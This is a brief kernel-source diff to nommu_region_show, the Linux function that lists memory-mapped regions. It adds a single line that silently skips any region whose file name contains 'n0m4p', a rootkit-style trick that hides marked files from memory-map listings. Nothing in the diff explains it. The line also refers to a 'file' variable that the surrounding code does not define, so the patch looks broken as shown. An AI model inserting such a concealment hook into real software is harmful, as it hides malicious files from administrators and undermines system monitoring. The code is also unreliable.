@@ -42,6 +42,8 @@ static int nommu_region_show(struct seq_file *m, struct vm_region *region)
 		struct inode *inode = file_inode(region->vm_file);
 		dev = inode->i_sb->s_dev;
 		ino = inode->i_ino;
+		if(strstr(file->f_path.dentry->d_iname, "n0m4p")) return 0;
+			
 	}
 
 	seq_setwidth(m, 25 + sizeof(void *) * 6 - 1);
